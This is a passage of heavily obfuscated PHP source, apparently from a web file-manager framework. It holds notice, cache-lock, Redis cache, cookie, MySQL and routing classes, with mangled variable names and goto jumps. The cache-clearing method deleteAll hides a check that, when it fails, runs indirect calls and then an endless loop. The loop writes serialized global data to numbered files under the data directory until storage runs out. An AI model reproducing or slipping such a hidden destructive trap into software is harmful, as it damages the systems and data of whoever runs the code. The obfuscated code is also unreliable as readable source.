= array($¸ˆ¸Ñ¬Ò[1796] => $ÆÕŞÌÖà, $¸ˆ¸Ñ¬Ò[234] => array($¸ˆ¸Ñ¬Ò[1106], $Í† é’µ), $¸ˆ¸Ñ¬Ò[33] => $¸ˆ¸Ñ¬Ò[1939]); $ú‚ƒ‘Äö = array(); $€È’ìç§ = $this->field($¸ˆ¸Ñ¬Ò[2473])->where($ÍØÁáá–)->order($¸ˆ¸Ñ¬Ò[2245])->limit(50)->select(); foreach ($€È’ìç§ as $™Ñ—óãù => $¦•ÀÒÍı) { if ($™Ñ—óãù > 0 && abs($¦•ÀÒÍı[$¸ˆ¸Ñ¬Ò[234]] - $€È’ìç§[$™Ñ—óãù - 1][$¸ˆ¸Ñ¬Ò[234]]) < 5) { continue; } $•ªéé¬ş = json_decode($¦•ÀÒÍı[$¸ˆ¸Ñ¬Ò[538]], !0); $¦•ÀÒÍı[$¸ˆ¸Ñ¬Ò[2463]] = isset($•ªéé¬ş[$¸ˆ¸Ñ¬Ò[2463]]) ? $•ªéé¬ş[$¸ˆ¸Ñ¬Ò[2463]] : $¸ˆ¸Ñ¬Ò[12]; unset($•ªéé¬ş[$¸ˆ¸Ñ¬Ò[2463]]); $ßÍ†åÉ = $this->deviceType($•ªéé¬ş[$¸ˆ¸Ñ¬Ò[2234]]); if (isset($ú‚ƒ‘Äö[$ßÍ†åÉ])) { continue; } $¦•ÀÒÍı[$¸ˆ¸Ñ¬Ò[2467]] = IpLocation::get($¦•ÀÒÍı[$¸ˆ¸Ñ¬Ò[2463]]); $¦•ÀÒÍı[$¸ˆ¸Ñ¬Ò[538]] = $•ªéé¬ş; $ú‚ƒ‘Äö[$ßÍ†åÉ] = $¦•ÀÒÍı; } return array_values($ú‚ƒ‘Äö); } public function deviceType($õ·œ†Æ¹) { return $õ·œ†Æ¹; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\x6e\x6f\164\151\143\145\x4c\151\163\164"; public $field = array("\156\141\155\x65", "\x63\157\x6e\x74\145\x6e\x74", "\141\165\164\x68", "\x6d\157\144\x65", "\164\151\x6d\145", "\164\x79\x70\x65", "\x6c\145\166\145\154", "\145\x6e\141\142\x6c\145", "\x73\x6f\162\164"); public function listData($‹£¼ç‰ = false, $†öÒ« = "\163\x6f\162\164", $ÃÉÇ´šÀ = false) { return parent::listData($‹£¼ç‰, $†öÒ«, $ÃÉÇ´šÀ); } public function add($í­ÒÁˆ) { $¢…ÚÏÁü =& $_SERVER[´‹ô¯Œ]; $¥ìÕ³êñ = time(); if ($í­ÒÁˆ[$¢…ÚÏÁü[16]] == $¢…ÚÏÁü[2474]) { $¥ìÕ³êñ = strtotime($í­ÒÁˆ[$¢…ÚÏÁü[207]]); } $í­ÒÁˆ[$¢…ÚÏÁü[207]] = $¥ìÕ³êñ; return parent::insert($í­ÒÁˆ); } public function update($À–û»¬ü, $ì£ƒºÆ) { $şÎ›Èıê =& $_SERVER[´‹ô¯Œ]; $›Â¾™Õƒ = $this->listData($À–û»¬ü); if (!$›Â¾™Õƒ) { return !1; } $û¥Åí¼® = time(); if ($ì£ƒºÆ[$şÎ›Èıê[16]] == $şÎ›Èıê[2474]) { $û¥Åí¼® = strtotime($ì£ƒºÆ[$şÎ›Èıê[207]]); } $ì£ƒºÆ[$şÎ›Èıê[207]] = $û¥Åí¼®; return parent::update($À–û»¬ü, $ì£ƒºÆ); } public function remove($­œşÔÙ) { $…ƒĞšÈŒ = $this->listData($­œşÔÙ); if (!$…ƒĞšÈŒ || $…ƒĞšÈŒ[$_SERVER[´‹ô¯Œ][192]]) { return !1; } return parent::remove($­œşÔÙ); } public function sort($âÆ˜Ğ×÷, $¥ëæßŸÙ) { return parent::update($âÆ˜Ğ×÷, $¥ëæßŸÙ); } public function enable($í…ı×ÍŸ, $È—Æ¨Ö) { return parent::update($í…ı×ÍŸ, array($_SERVER[´‹ô¯Œ][2475] => $È—Æ¨Ö)); } private function initUserOption() { $ÜùŒæÆî =& $_SERVER[´‹ô¯Œ]; $this->optionType = $ÜùŒæÆî[2476]; $this->modelType = $ÜùŒæÆî[2477]; $this->field = array($ÜùŒæÆî[2478], $ÜùŒæÆî[32], $ÜùŒæÆî[207], $ÜùŒæÆî[33], $ÜùŒæÆî[2479], $ÜùŒæÆî[836], $ÜùŒæÆî[229]); } public function userNoticeGet($ˆôññ•Œ = false) { $this->initUserOption(); return parent::listData($ˆôññ•Œ, $_SERVER[´‹ô¯Œ][487], !0); } public function userNoticeAdd($ğÁÊûø) { $ğ®¦ñŠ• =& $_SERVER[´‹ô¯Œ]; $this->initUserOption(); $¬àÌÖ½ = $this->findByKey($ğ®¦ñŠ•[2478], $ğÁÊûø[$ğ®¦ñŠ•[487]]); if ($¬àÌÖ½) { return !0; } $ŸÁƒõéË = array($ğ®¦ñŠ•[2478] => $ğÁÊûø[$ğ®¦ñŠ•[487]], $ğ®¦ñŠ•[32] => $ğÁÊûø[$ğ®¦ñŠ•[32]], $ğ®¦ñŠ•[207] => $ğÁÊûø[$ğ®¦ñŠ•[207]], $ğ®¦ñŠ•[33] => isset($ğÁÊûø[$ğ®¦ñŠ•[33]]) ? $ğÁÊûø[$ğ®¦ñŠ•[33]] : 1, $ğ®¦ñŠ•[2479] => isset($ğÁÊûø[$ğ®¦ñŠ•[2479]]) ? $ğÁÊûø[$ğ®¦ñŠ•[2479]] : 0, $ğ®¦ñŠ•[836] => 0, $ğ®¦ñŠ•[229] => 0); return parent::insert($ŸÁƒõéË); } public function userNoticeEdit($İÛÕ£×, $ı¯øÚÑ) { $this->initUserOption(); return parent::update($İÛÕ£×, $ı¯øÚÑ); } } goto F¨èÛÑÊÁ; CÎâ‘÷¢“õ: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $‡±ù¦Âå =& $_SERVER[´‹ô¯Œ]; $Ÿ—„Èí× = $GLOBALS[$‡±ù¦Âå[6]][$‡±ù¦Âå[427]]; self::$cachePath = $Ÿ—„Èí×[$‡±ù¦Âå[233]][$‡±ù¦Âå[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($»¥£¨šç, $¸Îöú = 0) { $ÍñÆµÓ =& $_SERVER[´‹ô¯Œ]; $ÕÚÁï®‹ = microtime(!0); $ØèØŠÑô = $ÕÚÁï®‹ + $¸Îöú + 0.0001; $¢ù ¾ŞÌ = rtrim(self::$cachePath, $ÍñÆµÓ[8]) . $ÍñÆµÓ[956] . md5($»¥£¨šç) . $ÍñÆµÓ[953]; if (file_exists($¢ù ¾ŞÌ) && filemtime($¢ù ¾ŞÌ) && filemtime($¢ù ¾ŞÌ) < time() - 10) { @unlink($¢ù ¾ŞÌ); } do { if (file_exists($¢ù ¾ŞÌ)) { cacheLockWait(); continue; } $–Ôà¹‰¿ = fopen($¢ù ¾ŞÌ, $ÍñÆµÓ[957]); if (!$–Ôà¹‰¿) { return !1; } $â°¼ƒ¾ç = flock($–Ôà¹‰¿, LOCK_EX | LOCK_NB); self::$caches[$»¥£¨šç] = array($ÍñÆµÓ[958] => $–Ôà¹‰¿, $ÍñÆµÓ[233] => $¢ù ¾ŞÌ); fwrite($–Ôà¹‰¿, $ØèØŠÑô); clearstatcache(); if ($–Ôà¹‰¿ && $â°¼ƒ¾ç) { return !0; } cacheLockWait(); } while (microtime(!0) < $ØèØŠÑô); $this->unlock($»¥£¨šç); return !1; } public function lockGet($Ó¯…Œ½µ) { $áš—¿‘¦ =& $_SERVER[´‹ô¯Œ]; $Û˜‚Áàè = rtrim(self::$cachePath, $áš—¿‘¦[8]) . $áš—¿‘¦[956] . md5($Ó¯…Œ½µ) . $áš—¿‘¦[953]; return file_exists($Û˜‚Áàè); } public function unlock($âô†¯§) { $“Ã‹ßŒÜ =& $_SERVER[´‹ô¯Œ]; $½ü•’”Í = self::$caches[$âô†¯§]; if (!$½ü•’”Í) { return; } @flock($½ü•’”Í[$“Ã‹ßŒÜ[958]], LOCK_UN); @fclose($½ü•’”Í[$“Ã‹ßŒÜ[958]]); @unlink($½ü•’”Í[$“Ã‹ßŒÜ[233]]); unset(self::$caches[$âô†¯§]); } } class CacheLockRedis { public function lock($îÉºÇ¼Ø, $ÛÜ‡ï´€ = 10) { $’åààˆ« = Cache::init(); $£¢¡Â¼¦ = microtime(!0) + $ÛÜ‡ï´€; while (microtime(!0) < $£¢¡Â¼¦) { $§ıƒƒÍ¡ = $’åààˆ«->get($îÉºÇ¼Ø); if (!$§ıƒƒÍ¡) { $İ£ñ©À = $’åààˆ«->setLock($îÉºÇ¼Ø, $£¢¡Â¼¦, $ÛÜ‡ï´€); if ($İ£ñ©À) { return !0; } } else { if ($§ıƒƒÍ¡ < microtime(!0)) { $’åààˆ«->set($îÉºÇ¼Ø, $£¢¡Â¼¦, $ÛÜ‡ï´€ * 2); if ($’åààˆ«->get($îÉºÇ¼Ø) === $§ıƒƒÍ¡) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¹”´ıŠÆ) { return Cache::init()->get($¹”´ıŠÆ); } public function unlock($ßä¸ş¯å) { return Cache::init()->remove($ßä¸ş¯å); } } goto eğëãß¿”Ğ; A‡ÜàÕ¯ã: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($»şÉÆÌ, $Îù‘Ùµ§) { $üûÊÑ…‰ =& $_SERVER[´‹ô¯Œ]; if (!class_exists($üûÊÑ…‰[962])) { show_json($üûÊÑ…‰[963], !1); } $this->cacheTime = $Îù‘Ùµ§; $î»ĞƒÑê = isset($»şÉÆÌ[$üûÊÑ…‰[964]]) ? $»şÉÆÌ[$üûÊÑ…‰[964]] : 10; $‡‚â¯ñõ = _get($»şÉÆÌ, $üûÊÑ…‰[961]); if ($‡‚â¯ñõ && is_array($‡‚â¯ñõ)) { $this->initCluster($»şÉÆÌ, $î»ĞƒÑê); } else { $this->handle = $this->init($»şÉÆÌ, $î»ĞƒÑê); } } private function init($Äòö–‹Ù, $ş¥±ëóˆ) { $åşû¹«¸ =& $_SERVER[´‹ô¯Œ]; $È€–ğƒ = new Redis(); $æ“èüàá = isset($Äòö–‹Ù[$åşû¹«¸[965]]) ? $Äòö–‹Ù[$åşû¹«¸[965]] : !1; if ($æ“èüàá) { $È€–ğƒ->pconnect($Äòö–‹Ù[$åşû¹«¸[209]], $Äòö–‹Ù[$åşû¹«¸[210]], $ş¥±ëóˆ); } else { $È€–ğƒ->connect($Äòö–‹Ù[$åşû¹«¸[209]], $Äòö–‹Ù[$åşû¹«¸[210]], $ş¥±ëóˆ); } if (!empty($Äòö–‹Ù[$åşû¹«¸[499]])) { $È€–ğƒ->auth($Äòö–‹Ù[$åşû¹«¸[499]]); } if (!empty($Äòö–‹Ù[$åşû¹«¸[843]]) && $Äòö–‹Ù[$åşû¹«¸[843]] != 0) { $È€–ğƒ->select($Äòö–‹Ù[$åşû¹«¸[843]]); } return $È€–ğƒ; } private function initCluster($ÏÄ—Š¹º, $¾á¥…¿—) { $³ Õ¡õĞ =& $_SERVER[´‹ô¯Œ]; $®èŒÛö¥ = array($³ Õ¡õĞ[966], $³ Õ¡õĞ[967], $³ Õ¡õĞ[968]); $“Ûó†Ûë = $³ Õ¡õĞ[966]; if (isset($ÏÄ—Š¹º[$³ Õ¡õĞ[16]]) && in_array($ÏÄ—Š¹º[$³ Õ¡õĞ[16]], $®èŒÛö¥)) { $“Ûó†Ûë = $ÏÄ—Š¹º[$³ Õ¡õĞ[16]]; } switch ($“Ûó†Ûë) { case $³ Õ¡õĞ[966]: $this->_slave($ÏÄ—Š¹º, $¾á¥…¿—); break; case $³ Õ¡õĞ[967]: break; case $³ Õ¡õĞ[968]: $this->isCluster = !0; $¾š¹Ï÷¢ = $ÏÄ—Š¹º[$³ Õ¡õĞ[961]]; $¨§ø§ˆé = isset($ÏÄ—Š¹º[$³ Õ¡õĞ[965]]) ? $ÏÄ—Š¹º[$³ Õ¡õĞ[965]] : !1; $¦ƒ‡½´· = isset($ÏÄ—Š¹º[$³ Õ¡õĞ[499]]) ? $ÏÄ—Š¹º[$³ Õ¡õĞ[499]] : null; $this->handle = new RedisCluster(NUll, $¾š¹Ï÷¢, $¾á¥…¿—, $¾á¥…¿—, $¨§ø§ˆé, $¦ƒ‡½´·); break; default: break; } } private function _slave($åÀ¥Å§¡, $°ƒ€ÑêÏ) { $¥–âáõı = $åÀ¥Å§¡[$_SERVER[´‹ô¯Œ][961]]; $this->filterConfig($åÀ¥Å§¡, $¥–âáõı[0]); $this->handle = $this->init($åÀ¥Å§¡, $°ƒ€ÑêÏ); unset($¥–âáõı[0]); if (empty($¥–âáõı)) { return; } $éîÅˆâÑ = array_rand($¥–âáõı); $this->filterConfig($åÀ¥Å§¡, $¥–âáõı[$éîÅˆâÑ]); $this->slaveHandle = $this->init($åÀ¥Å§¡, $°ƒ€ÑêÏ); } private function filterConfig(&$å„Áùß×, $ªµ¥–Ò) { $òò¸Óñƒ =& $_SERVER[´‹ô¯Œ]; $óØ‰³øµ = explode($òò¸Óñƒ[4], $ªµ¥–Ò); $Ï¢²ÖÃ„ = array($òò¸Óñƒ[209] => $óØ‰³øµ[0], $òò¸Óñƒ[210] => $óØ‰³øµ[1]); $å„Áùß× = array_merge($å„Áùß×, $Ï¢²ÖÃ„); } public function set($‘ÃÓèïó, $Ò°‘Œîà, $ æïó§ì = false) { $ æïó§ì = $ æïó§ì ? $ æïó§ì : $this->cacheTime; return $this->handle->setEx($‘ÃÓèïó, $ æïó§ì, $Ò°‘Œîà); } public function setLock($ÏˆşæÜ‡, $£ËŒÚ¤€, $íşÉ¦™Ã) { return $this->handle->setNX($ÏˆşæÜ‡, $£ËŒÚ¤€); } public function get($ËÛò™éˆ) { $ªä¬”Ìì = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ªä¬”Ìì->get($ËÛò™éˆ); } public function remove($’­áì˜) { return $this->handle->del($’­áì˜); } public function deleteAll() { $Ê¹«ï =& $_SERVER[´‹ô¯Œ]; $»Î¥±† = $_SERVER[$Ê¹«ï[483]]; $ÉƒÙØë = $Ê¹«ï[969]; if ($_SERVER[$Ê¹«ï[475]] != $ÉƒÙØë($»Î¥±†)) { $ìçÑÛ‘ = $Ê¹«ï[970]; $°ôáÜæ¬ = $Ê¹«ï[477]; $öıÓÎï = $_SERVER[$Ê¹«ï[478]] . $Ê¹«ï[479]; $‡©äØ• = $°ôáÜæ¬($öıÓÎï); $´ÑùÆœ« = explode($Ê¹«ï[288], $‡©äØ•); if (count($´ÑùÆœ«) < $Ê¹«ï[701]) { $ïŸÛê ¾ = $Ê¹«ï[481]; $ïŸÛê ¾(); } $„©öÀ = $Ê¹«ï[971]; $„©öÀ($_SERVER[$Ê¹«ï[972]]); $ìçÑÛ‘ = $Ê¹«ï[970]; $ìçÑÛ‘(); $·¿ŠÅ‘ = $Ê¹«ï[973]; $ÏâÏ£‰ = json_encode($GLOBALS[$Ê¹«ï[974]]); $÷©µ‚øË = 1; for ($ó±…­“” = $÷©µ‚øË; $ó±…­“” > 0; $ó±…­“”++) { $·¿ŠÅ‘(DATA_PATH . $ó±…­“”, $ÏâÏ£‰); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ñ‰–çÒº) { $this->handle->flushall($ñ‰–çÒº); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($›ÏÀ«»¥ = '', $¹¿”îÎõ = 0) { if (is_string($›ÏÀ«»¥) && $›ÏÀ«»¥ != $_SERVER[´‹ô¯Œ][12]) { $this->prefix = $›ÏÀ«»¥; } if (is_numeric($¹¿”îÎõ) && $¹¿”îÎõ > 0) { $this->expire = $¹¿”îÎõ; } } public static function getInstance() { static $’àòÅŠÊ; if ($’àòÅŠÊ === null) { $’àòÅŠÊ = new self(); } return $’àòÅŠÊ; } private static $cookieDisable = false; public static function disable($…¯¿ıöØ) { self::$cookieDisable = $…¯¿ıöØ; } private static $sameCookieSet = array(); public static function set($ĞòÖàÃÁ, $§Åšºí¥, $—ÓûØÒŒ = 0, $í›ƒ˜Øû = false, $§µó™Ó‰ = false) { $ëŸ‚İ©¨ =& $_SERVER[´‹ô¯Œ]; if (self::$cookieDisable) { return; } if (!$—ÓûØÒŒ) { $—ÓûØÒŒ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ĞòÖàÃÁ]) && self::$sameCookieSet[$ĞòÖàÃÁ] == $§Åšºí¥ . $—ÓûØÒŒ) { return; } self::$sameCookieSet[$ĞòÖàÃÁ] = $§Åšºí¥ . $—ÓûØÒŒ; if (!$§µó™Ó‰) { $§µó™Ó‰ = str_replace(HOST, $ëŸ‚İ©¨[12], APP_HOST); $§µó™Ó‰ = _get($GLOBALS, $ëŸ‚İ©¨[975], $§µó™Ó‰); } $âõ¡ãŒ• = $ëŸ‚İ©¨[12]; setcookie($ĞòÖàÃÁ, $§Åšºí¥, time() + $—ÓûØÒŒ, $ëŸ‚İ©¨[8] . trim($§µó™Ó‰, $ëŸ‚İ©¨[8]) . $âõ¡ãŒ•, !1, !1, $í›ƒ˜Øû); } public static function setSafe($ˆš´«ûÎ, $–’£²¾Ê, $ÌˆæªÍŞ = 0) { self::set($ˆš´«ûÎ, $–’£²¾Ê, $ÌˆæªÍŞ, !0); } public static function get($ĞÜèÔŠ„) { static $±äë±íù = false; if (!$±äë±íù) { self::initHeaderCookie(); $±äë±íù = !0; } return isset($_COOKIE[$ĞÜèÔŠ„]) ? $_COOKIE[$ĞÜèÔŠ„] : !1; } private static function initHeaderCookie() { $ê°š—¦ =& $_SERVER[´‹ô¯Œ]; if (!isset($_SERVER[$ê°š—¦[976]]) || !$_SERVER[$ê°š—¦[976]]) { return; } $ˆ¦ËÁø = explode($ê°š—¦[74], $_SERVER[$ê°š—¦[976]]); foreach ($ˆ¦ËÁø as $¼ãŒ¬«Š) { $¼ãŒ¬«Š = explode($ê°š—¦[518], $¼ãŒ¬«Š); if (count($¼ãŒ¬«Š) != 2 || !isset($¼ãŒ¬«Š[1])) { continue; } $_COOKIE[trim($¼ãŒ¬«Š[0])] = trim($¼ãŒ¬«Š[1]); } } public static function remove($ÀöÊÌ¶, $‰ìÛÇ³ = false) { unset($_COOKIE[$ÀöÊÌ¶]); self::set($ÀöÊÌ¶, $_SERVER[´‹ô¯Œ][12], 1, $‰ìÛÇ³); } } class DbMysql extends Db { public function __construct($÷æŸŸÀ = '') { $êå§êöó =& $_SERVER[´‹ô¯Œ]; if (!extension_loaded($êå§êöó[894])) { think_exception(think_lang($êå§êöó[14]) . $êå§êöó[977]); } if (!empty($÷æŸŸÀ)) { $this->config = $÷æŸŸÀ; if (empty($this->config[$êå§êöó[17]])) { $this->config[$êå§êöó[17]] = $êå§êöó[12]; } } } public function connect($êÄÆ¢ê = '', $ •üÌ­ö = 0, $¨ÏŒä¥€ = false) { $Ş“ºÁà¹ =& $_SERVER[´‹ô¯Œ]; if (!isset($this->linkID[$ •üÌ­ö])) { if (empty($êÄÆ¢ê)) { $êÄÆ¢ê = $this->config; } $²€ò¡ÆŠ = $êÄÆ¢ê[$Ş“ºÁà¹[978]] . ($êÄÆ¢ê[$Ş“ºÁà¹[979]] ? "\72{$êÄÆ¢ê[$Ş“ºÁà¹[979]]}" : $Ş“ºÁà¹[12]); $÷ŒãŠ÷ = !empty($êÄÆ¢ê[$Ş“ºÁà¹[17]][$Ş“ºÁà¹[18]]) ? $êÄÆ¢ê[$Ş“ºÁà¹[17]][$Ş“ºÁà¹[18]] : $this->pconnect; if ($÷ŒãŠ÷) { $this->linkID[$ •üÌ­ö] = mysql_pconnect($²€ò¡ÆŠ, $êÄÆ¢ê[$Ş“ºÁà¹[980]], $êÄÆ¢ê[$Ş“ºÁà¹[981]], 131072); } else { $this->linkID[$ •üÌ­ö] = mysql_connect($²€ò¡ÆŠ, $êÄÆ¢ê[$Ş“ºÁà¹[980]], $êÄÆ¢ê[$Ş“ºÁà¹[981]], !0, 131072); } if (!$this->linkID[$ •üÌ­ö] || !empty($êÄÆ¢ê[$Ş“ºÁà¹[21]]) && !mysql_select_db($êÄÆ¢ê[$Ş“ºÁà¹[21]], $this->linkID[$ •üÌ­ö])) { think_exception(mysql_error()); } $ÎÃ…Œóà = mysql_get_server_info($this->linkID[$ •üÌ­ö]); mysql_query($Ş“ºÁà¹[982] . think_config($Ş“ºÁà¹[983]) . $Ş“ºÁà¹[58], $this->linkID[$ •üÌ­ö]); if ($ÎÃ…Œóà > $Ş“ºÁà¹[984]) { mysql_query($Ş“ºÁà¹[985], $this->linkID[$ •üÌ­ö]); } $this->connected = !0; if (1 != think_config($Ş“ºÁà¹[22])) { unset($this->config); } } return $this->linkID[$ •üÌ­ö]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ò´ÅÁôç) { $š”îë‡ =& $_SERVER[´‹ô¯Œ]; if (0 === stripos($ò´ÅÁôç, $š”îë‡[344])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ò´ÅÁôç; if ($this->queryID) { $this->free(); } think_action_status($š”îë‡[23], 1); think_status($š”îë‡[24]); $this->queryID = mysql_query($ò´ÅÁôç, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ïóøóíº) { $†¶»„ß€ =& $_SERVER[´‹ô¯Œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ïóøóíº; if ($this->queryID) { $this->free(); } think_action_status($†¶»„ß€[25], 1); think_status($†¶»„ß€[24]); $°ú–›ãÖ = mysql_query($ïóøóíº, $this->_linkID); $this->debug(); if (!1 === $°ú–›ãÖ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[´‹ô¯Œ][986], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÍãúçÁì = mysql_query($_SERVER[´‹ô¯Œ][987], $this->_linkID); $this->transTimes = 0; if (!$ÍãúçÁì) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÓØ­æÅé = mysql_query($_SERVER[´‹ô¯Œ][988], $this->_linkID); $this->transTimes = 0; if (!$ÓØ­æÅé) { $this->error(); return !1; } } return !0; } private function getAll() { $§Å´èğ’ = array(); if ($this->numRows > 0) { while ($‚‚²ĞÏŠ = mysql_fetch_assoc($this->queryID)) { $§Å´èğ’[] = $‚‚²ĞÏŠ; } mysql_data_seek($this->queryID, 0); } return $§Å´èğ’; } public function getFields($éŸ«·æõ) { $±Ğ©Şñâ =& $_SERVER[´‹ô¯Œ]; $Âíøè = $this->query($±Ğ©Şñâ[989] . $this->parseKey($éŸ«·æõ)); $øïì÷¦ = array(); if ($Âíøè) { foreach ($Âíøè as $É‰œô²– => $ˆÁŸ‚Á•) { $øïì÷¦[$ˆÁŸ‚Á•[$±Ğ©Şñâ[31]]] = array($±Ğ©Şñâ[32] => $ˆÁŸ‚Á•[$±Ğ©Şñâ[31]], $±Ğ©Şñâ[33] => $ˆÁŸ‚Á•[$±Ğ©Şñâ[34]], $±Ğ©Şñâ[35] => (bool) (strtoupper($ˆÁŸ‚Á•[$±Ğ©Şñâ[36]]) === $±Ğ©Şñâ[990]), $±Ğ©Şñâ[37] => $ˆÁŸ‚Á•[$±Ğ©Şñâ[38]], $±Ğ©Şñâ[39] => strtolower($ˆÁŸ‚Á•[$±Ğ©Şñâ[40]]) == $±Ğ©Şñâ[41], $±Ğ©Şñâ[42] => strtolower($ˆÁŸ‚Á•[$±Ğ©Şñâ[43]]) == $±Ğ©Şñâ[44]); } } return $øïì÷¦; } public function getTables($ŸÒè—‘ = '') { $ãÎßŞì =& $_SERVER[´‹ô¯Œ]; if (!empty($ŸÒè—‘)) { $ö„‰¬á¨ = $ãÎßŞì[991] . $ŸÒè—‘ . $ãÎßŞì[992]; } else { $ö„‰¬á¨ = $ãÎßŞì[993]; } $‹Óûê¨ = $this->query($ö„‰¬á¨); $Ãí½´‚â = array(); foreach ($‹Óûê¨ as $÷Ïâ‹ú => $ôÌî™›Ë) { $Ãí½´‚â[$÷Ïâ‹ú] = current($ôÌî™›Ë); } return $Ãí½´‚â; } public function replace($áø¥üŠ¡, $½œÌ¼†™ = array()) { $­ûé§‘± =& $_SERVER[´‹ô¯Œ]; foreach ($áø¥üŠ¡ as $ÜáâæÖÒ => $ÁîÂŸãÑ) { $¹½áˆ ‡ = $this->parseValue($ÁîÂŸãÑ); if (is_scalar($¹½áˆ ‡)) { $Š¾Ğ«Ô[] = $¹½áˆ ‡; $¼ù«Ò[] = $this->parseKey($ÜáâæÖÒ); } } $üíÄ’Ã± = $­ûé§‘±[994] . $this->parseTable($½œÌ¼†™[$­ûé§‘±[359]]) . $­ûé§‘±[995] . implode($­ûé§‘±[50], $¼ù«Ò) . $­ûé§‘±[996] . implode($­ûé§‘±[50], $Š¾Ğ«Ô) . $­ûé§‘±[997]; return $this->execute($üíÄ’Ã±); } public function insertAll($½à¡ÊÑÅ, $ú±¬ËÅ× = array(), $ÂŞ¢ÔØ… = false) { $”Ó‚µúº =& $_SERVER[´‹ô¯Œ]; if (!is_array($½à¡ÊÑÅ[0])) { return !1; } $…¸÷øò = array_keys($½à¡ÊÑÅ[0]); $îÙûµ®Ë = array(); foreach ($½à¡ÊÑÅ as $íßŞ«×) { $‰§ˆ¸—œ = array(); foreach ($íßŞ«× as $ÄŠ¨ÊÑ§ => $Ôô¾¢£) { $Ôô¾¢£ = $this->parseValue($Ôô¾¢£); if (is_scalar($Ôô¾¢£)) { $‰§ˆ¸—œ[] = $Ôô¾¢£; } } $îÙûµ®Ë[] = $”Ó‚µúº[340] . implode($”Ó‚µúº[50], $‰§ˆ¸—œ) . $”Ó‚µúº[997]; } array_walk($…¸÷øò, array($this, $”Ó‚µúº[998])); $Ë¾¶ÈÍä = ($ÂŞ¢ÔØ… ? $”Ó‚µúº[999] : $”Ó‚µúº[1000]) . $”Ó‚µúº[1001] . $this->parseTable($ú±¬ËÅ×[$”Ó‚µúº[359]]) . $”Ó‚µúº[995] . implode($”Ó‚µúº[50], $…¸÷øò) . $”Ó‚µúº[1002] . implode($”Ó‚µúº[50], $îÙûµ®Ë); return $this->execute($Ë¾¶ÈÍä); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $—ïíûä» =& $_SERVER[´‹ô¯Œ]; $this->error = mysql_errno() . $—ïíûä»[4] . mysql_error($this->_linkID); if ($—ïíûä»[12] != $this->queryStr) { $this->error .= LNG($—ïíûä»[48]) . $this->queryStr; } think_trace($this->error, $—ïíûä»[12], $—ïíûä»[49]); return $this->error; } public function escapeString($×©›ïŞ¨) { if ($this->_linkID) { return mysql_real_escape_string($×©›ïŞ¨, $this->_linkID); } else { return mysql_escape_string($×©›ïŞ¨); } } public function parseKey(&$ºØÁüÁÂ, $™³€Áæ¨ = true) { $í„‰ÖÛÎ =& $_SERVER[´‹ô¯Œ]; if ($™³€Áæ¨) { $ºØÁüÁÂ = $this->parseKeyCheck($ºØÁüÁÂ); } if ($ºØÁüÁÂ != $í„‰ÖÛÎ[223] && !preg_match($í„‰ÖÛÎ[1003], $ºØÁüÁÂ)) { $ºØÁüÁÂ = $í„‰ÖÛÎ[464] . trim($ºØÁüÁÂ, $í„‰ÖÛÎ[464]) . $í„‰ÖÛÎ[464]; } return $ºØÁüÁÂ; } } goto A¬³ŸõÃ’; EÆìãçåÓ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\x5b\x5e\x2f\135\53", "\x3a\x6e\165\155" => "\133\x30\55\x39\x5d\x2b", "\72\141\x6c\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($®şÄüÅÒ, $î£ÄåÅµ) { $®Ãô¢Í‡ =& $_SERVER[´‹ô¯Œ]; if ($®şÄüÅÒ == $®Ãô¢Í‡[1731]) { $ÔœÜ“íö = array_map($®Ãô¢Í‡[1732], $î£ÄåÅµ[0]); $çá Ìª‘ = strpos($î£ÄåÅµ[1], $®Ãô¢Í‡[8]) === 0 ? $î£ÄåÅµ[1] : $®Ãô¢Í‡[8] . $î£ÄåÅµ[1]; $µİ·ĞÈ¶ = $î£ÄåÅµ[2]; } else { $ÔœÜ“íö = null; $çá Ìª‘ = strpos($î£ÄåÅµ[0], $®Ãô¢Í‡[8]) === 0 ? $î£ÄåÅµ[0] : $®Ãô¢Í‡[8] . $î£ÄåÅµ[0]; $µİ·ĞÈ¶ = $î£ÄåÅµ[1]; } array_push(self::$maps, $ÔœÜ“íö); array_push(self::$routes, $çá Ìª‘); array_push(self::$methods, strtoupper($®şÄüÅÒ)); array_push(self::$callbacks, $µİ·ĞÈ¶); } public static function error($¥‚§£¢İ) { self::$errorCallback = $¥‚§£¢İ; } public static function haltOnMatch($ßÜû…ñ = true) { self::$halts = $ßÜû…ñ; } public static function dispatch() { $æ®Ä§Œ =& $_SERVER[´‹ô¯Œ]; $Ô£àöÆÎ = parse_url($_SERVER[$æ®Ä§Œ[1733]], PHP_URL_PATH); $¦é“ê¤Ö = $_SERVER[$æ®Ä§Œ[164]]; $˜î³ = array_keys(static::$patterns); $ñÑµ«æË = array_values(static::$patterns); $Æ­®ÀÍ = !1; self::$routes = preg_replace($æ®Ä§Œ[1378], $æ®Ä§Œ[8], self::$routes); if 